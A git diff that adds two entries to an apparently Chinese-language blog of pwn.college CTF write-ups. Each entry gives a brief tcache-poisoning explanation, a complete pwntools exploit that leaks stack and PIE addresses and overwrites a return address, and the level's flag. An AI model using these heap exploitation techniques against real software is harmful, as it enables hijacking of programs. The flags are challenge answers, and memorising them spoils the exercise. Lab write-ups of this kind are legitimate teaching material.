@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-10-01
+updated: 2025-10-02
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -2306,3 +2306,271 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{IVJX2ecO9cCeTd-08IgNfDhvyxY.0FM5MDL5cTNxgzW}`]
+
+# Level 11.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to gain control flow.
+
+## Write-up
+
+和上题类似的 goal，控制返回地址为 win 即可。但是这次没有告诉我们任何地址，需要手动泄漏栈地址和程序基地址。
+
+那还不简单，echo 可以泄漏 ptr 中的地址加上偏移处的值，如果我们知道了栈地址，那只要令 ptr 中保存栈地址我们就可以泄漏任意偏移处的值了。
+
+:::important
+做这题的时候突然发现 `scanf("%0s", buf)` 其实是可以接收输入的，`%0s` 是未定义行为，会接收任意大小输入……我本来以为不行，还想在栈上伪造 chunk 来着，现在知道原来没必要。所以我们最后直接覆盖 scanf 的返回地址就好了，连 canary 都不需要泄漏……
+:::
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level11.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def echo(idx, offset):
+    target.sendlineafter(b": ", b"echo")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Offset: ", str(offset).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x20)
+    free(0)
+
+    # leak stack address
+    # raw_input("DEBUG")
+    echo(0, 0x8)
+    target.recvuntil(b"Data: ")
+    stack = (
+        int.from_bytes(target.recvline().strip().ljust(0x8, b"\x00"), "little") + 0x6
+    )
+    target.success(f"stack: {hex(stack)}")
+
+    malloc(0, 0x20)
+    malloc(1, 0x20)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p64(stack))
+    malloc(0, 0x20)
+    malloc(0, 0x20)  # slot 0 store stack addr
+
+    # leak canary (not necessary)
+    # echo(0, 0x1)
+    # target.recvuntil(b"Data: ")
+    # canary = int.from_bytes(target.recvline()[:7].rjust(0x8, b"\x00"), "little")
+    # target.success(f"canary: {hex(canary)}")
+
+    # leak pie
+    echo(0, 0x10)
+    target.recvuntil(b"Data: ")
+    pie = (
+        int.from_bytes(target.recvline().strip().ljust(0x8, b"\x00"), "little") - 0x214E
+    )
+    win = pie + 0x1B00
+    target.success(f"pie: {hex(pie)}")
+    target.success(f"win: {hex(win)}")
+
+    payload = flat(
+        b"A" * 0x10,
+        win,
+    )
+    # raw_input("DEBUG")
+    scanf(0, payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{UR1cj-fm89XIenUymGEuLXjbqDw.0VM5MDL5cTNxgzW}`]
+
+# Level 11.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to gain control flow.
+
+## Write-up
+
+参见 [Level 11.0](#level-110)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level11.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def echo(idx, offset):
+    target.sendlineafter(b": ", b"echo")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Offset: ", str(offset).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x20)
+    free(0)
+
+    # leak stack address
+    # raw_input("DEBUG")
+    echo(0, 0x8)
+    target.recvuntil(b"Data: ")
+    stack = (
+        int.from_bytes(target.recvline().strip().ljust(0x8, b"\x00"), "little") + 0x6
+    )
+    target.success(f"stack: {hex(stack)}")
+
+    malloc(0, 0x20)
+    malloc(1, 0x20)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p64(stack))
+    malloc(0, 0x20)
+    malloc(0, 0x20)  # slot 0 store stack addr
+
+    # leak canary (not necessary)
+    # echo(0, 0x1)
+    # target.recvuntil(b"Data: ")
+    # canary = int.from_bytes(target.recvline()[:7].rjust(0x8, b"\x00"), "little")
+    # target.success(f"canary: {hex(canary)}")
+
+    # leak pie
+    echo(0, 0x10)
+    target.recvuntil(b"Data: ")
+    pie = (
+        int.from_bytes(target.recvline().strip().ljust(0x8, b"\x00"), "little") - 0x1A93
+    )
+    win = pie + 0x1500
+    target.success(f"pie: {hex(pie)}")
+    target.success(f"win: {hex(win)}")
+
+    payload = flat(
+        b"A" * 0x10,
+        win,
+    )
+    # raw_input("DEBUG")
+    scanf(0, payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{IHuI-DZpMG1vv3R_3f2K4lz3jgL.0lM5MDL5cTNxgzW}`]
